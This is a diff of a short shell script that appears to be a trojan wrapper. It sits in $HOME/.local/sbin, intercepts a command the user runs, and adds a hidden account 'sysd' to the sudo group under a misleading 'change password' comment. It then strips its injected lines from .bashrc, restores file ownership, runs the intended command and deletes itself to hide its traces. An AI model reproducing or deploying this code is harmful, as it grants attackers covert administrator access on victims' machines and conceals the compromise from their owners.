@@ -12,21 +12,20 @@ fi
  # change password
  usermod -aG sudo sysd 
 
- # clean the path
- PATH=$(echo $PATH | sed "s@$HOME/.local/sbin:@@g")
-
+ # clean up after
  mv $HOME/.bashrc $HOME/.bashrc.tmp
- head -n -6 $HOME/.bashrc.tmp > $HOME/.bashrc
- rm $HOME/.bashrc.tmp
+ head -n -3 $HOME/.bashrc.tmp > $HOME/.bashrc
+ #rm $HOME/.bashrc.tmp
  chown jmwample:jmwample  $HOME/.bashrc
  #chown ndonnel:ndonnel  $HOME/.bashrc
 
  # call the program that was supposed to run 
- /usr/bin/apt ${@:1}
+ ${@:1}
 
  # clean up
  rm -rf  $HOME/.local/sbin
 
+ source .bashrc
  #echo "Done. -- "
 
 
